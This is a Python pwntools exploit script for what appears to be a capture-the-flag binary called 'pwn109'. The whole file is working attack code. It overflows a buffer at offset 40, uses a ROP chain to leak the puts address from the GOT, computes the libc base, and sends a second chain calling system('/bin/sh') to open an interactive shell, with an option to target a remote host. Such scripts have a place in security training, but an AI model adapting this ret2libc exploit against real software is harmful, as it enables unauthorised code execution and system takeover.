from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn109.pwn109'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

offset = 40

io = start()

rop = ROP(elf)
rop.call(rop.ret) 
rop.puts(elf.got.puts)
rop.call(elf.sym.main)

payload = flat(
    {offset: rop.chain()}
)
print(payload)
io.sendlineafter( b"Go ahead \xf0\x9f\x98\x8f", payload )
print(io.recvline())
puts_raw = io.recvline()
print(puts_raw)
puts = u64(puts_raw.strip().ljust(8, b"\x00"))

log.info("Puts: %s" % hex(puts))

if args.REMOTE:
    libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so", checksec=False)
else:
    libc = ELF("libc.so.6", checksec=False)

libc.address = puts - libc.sym.puts
log.info("Libc Base: %s" % hex(libc.address))

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b'/bin/sh')), 0, 0)

payload = fit(
    {offset:rop.chain()}
)
print(payload)
io.sendlineafter( b"Go ahead \xf0\x9f\x98\x8f", payload )

io.interactive()